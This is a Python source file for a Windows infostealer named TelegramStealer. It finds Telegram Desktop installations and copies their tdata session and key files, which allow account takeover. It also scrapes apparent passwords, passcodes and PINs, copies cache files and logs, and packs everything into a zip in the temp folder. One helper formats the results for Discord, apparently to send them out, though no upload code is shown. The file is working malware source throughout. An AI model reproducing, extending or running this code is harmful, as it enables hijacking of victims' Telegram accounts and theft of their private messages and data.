import os
import sys
import json
import base64
import shutil
import tempfile
import zipfile
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
import re

class TelegramStealer:
    def __init__(self):
        self.appdata = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.temp_dir = tempfile.gettempdir()
        self.telegram_paths = []
        self.sessions = []
        
    def get_telegram_paths(self):
        paths = []
        
        telegram_variants = [
            {
                "name": "Telegram Desktop",
                "path": os.path.join(self.appdata, "Telegram Desktop"),
                "tdata": os.path.join(self.appdata, "Telegram Desktop", "tdata")
            },
            {
                "name": "Telegram Desktop Local",
                "path": os.path.join(self.localappdata, "Telegram Desktop"),
                "tdata": os.path.join(self.localappdata, "Telegram Desktop", "tdata")
            },
            {
                "name": "Telegram Portable",
                "path": os.path.join(self.appdata, "Telegram"),
                "tdata": os.path.join(self.appdata, "Telegram", "tdata")
            }
        ]
        
        for variant in telegram_variants:
            if os.path.exists(variant["path"]):
                paths.append(variant)
        
        return paths
    
    def get_tdata_files(self, tdata_path):
        files = []
        
        if not os.path.exists(tdata_path):
            return files
        
        try:
            for root, dirs, filenames in os.walk(tdata_path):
                for filename in filenames:
                    file_path = os.path.join(root, filename)
                    
                    if filename in ["key_datas", "maps", "sessions"] or filename.startswith("D"):
                        files.append(file_path)
                    elif filename.endswith(".json") or filename.endswith(".dat"):
                        files.append(file_path)
                    elif filename.startswith("usertag") or filename.startswith("settings"):
                        files.append(file_path)
        except:
            pass
        
        return files
    
    def steal_session_files(self):
        sessions = []
        
        for telegram in self.get_telegram_paths():
            tdata_path = telegram.get("tdata", "")
            
            if os.path.exists(tdata_path):
                files = self.get_tdata_files(tdata_path)
                
                for file_path in files:
                    try:
                        file_size = os.path.getsize(file_path)
                        
                        if file_size > 0:
                            with open(file_path, "rb") as f:
                                file_data = f.read()
                            
                            sessions.append({
                                "source": telegram["name"],
                                "file": os.path.basename(file_path),
                                "path": file_path,
                                "size": file_size,
                                "data": base64.b64encode(file_data).decode()
                            })
                    except:
                        pass
        
        return sessions
    
    def steal_telegram_passwords(self):
        passwords = []
        
        for telegram in self.get_telegram_paths():
            tdata_path = telegram.get("tdata", "")
            
            if os.path.exists(tdata_path):
                # Look for password files
                password_files = ["key_datas", "maps"]
                
                for file_name in password_files:
                    file_path = os.path.join(tdata_path, file_name)
                    
                    if os.path.exists(file_path):
                        try:
                            with open(file_path, "rb") as f:
                                data = f.read()
                            
                            # Extract potential passwords
                            if isinstance(data, bytes):
                                data_str = data.decode('utf-8', errors='ignore')
                            else:
                                data_str = str(data)
                            
                            # Look for password patterns
                            password_patterns = [
                                r'password["\s:]+["\']([^"\']+)["\']',
                                r'passcode["\s:]+["\']([^"\']+)["\']',
                                r'pin["\s:]+["\']([^"\']+)["\']'
                            ]
                            
                            for pattern in password_patterns:
                                matches = re.findall(pattern, data_str, re.IGNORECASE)
                                if matches:
                                    passwords.extend(matches)
                        except:
                            pass
        
        return passwords
    
    def steal_telegram_cache(self):
        cache_data = []
        
        for telegram in self.get_telegram_paths():
            cache_path = os.path.join(telegram["path"], "cache")
            
            if os.path.exists(cache_path):
                try:
                    for root, dirs, files in os.walk(cache_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            file_size = os.path.getsize(file_path)
                            
                            if file_size > 0 and file_size < 10485760:  # Less than 10MB
                                with open(file_path, "rb") as f:
                                    data = f.read()
                                
                                cache_data.append({
                                    "source": telegram["name"],
                                    "file": os.path.basename(file_path),
                                    "size": file_size,
                                    "data": base64.b64encode(data).decode()
                                })
                except:
                    pass
        
        return cache_data
    
    def steal_telegram_logs(self):
        logs = []
        
        for telegram in self.get_telegram_paths():
            log_path = os.path.join(telegram["path"], "log.txt")
            
            if os.path.exists(log_path):
                try:
                    with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
                        log_content = f.read()
                    
                    logs.append({
                        "source": telegram["name"],
                        "file": "log.txt",
                        "content": log_content[:10000]  # Limit to first 10000 characters
                    })
                except:
                    pass
        
        return logs
    
    def create_session_zip(self, sessions, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, "telegram_sessions.zip")
        
        try:
            with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                for session in sessions:
                    file_data = base64.b64decode(session.get("data", ""))
                    file_name = f"{session.get('source', 'unknown')}/{session.get('file', 'unknown')}"
                    zipf.writestr(file_name, file_data)
            
            return output_path
        except:
            return None
    
    def check_telegram_installed(self):
        for telegram in self.get_telegram_paths():
            if os.path.exists(telegram["path"]):
                return True
        return False
    
    def get_telegram_info(self):
        info = []
        
        for telegram in self.get_telegram_paths():
            tdata_path = telegram.get("tdata", "")
            
            if os.path.exists(tdata_path):
                # Get session info
                session_files = os.listdir(tdata_path)
                session_count = len([f for f in session_files if f.startswith("D")])
                
                info.append({
                    "name": telegram["name"],
                    "path": telegram["path"],
                    "tdata_exists": True,
                    "session_count": session_count
                })
        
        return info
    
    def format_sessions_for_discord(self, sessions, limit=100):
        formatted = []
        
        for session in sessions[:limit]:
            formatted.append({
                "source": session.get("source", ""),
                "file": session.get("file", ""),
                "size": session.get("size", 0)
            })
        
        return formatted
    
    def export_sessions_to_file(self, sessions, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, "telegram_sessions.txt")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                for session in sessions:
                    f.write(f"Source: {session.get('source', '')}\n")
                    f.write(f"File: {session.get('file', '')}\n")
                    f.write(f"Size: {session.get('size', 0)} bytes\n")
                    f.write(f"Data: {session.get('data', '')}\n")
                    f.write("-" * 50 + "\n")
            
            return output_path
        except:
            return None
    
    def steal_all(self):
        sessions = self.steal_session_files()
        
        return {
            "installed": self.check_telegram_installed(),
            "info": self.get_telegram_info(),
            "total_sessions": len(sessions),
            "sessions": sessions,
            "passwords": self.steal_telegram_passwords(),
            "cache": self.steal_telegram_cache(),
            "logs": self.steal_telegram_logs()
        }

if __name__ == "__main__":
    stealer = TelegramStealer()
    data = stealer.steal_all()
    print(f"Telegram installed: {data['installed']}")
    print(f"Total sessions found: {data['total_sessions']}")
    print(json.dumps(data['info'], indent=2))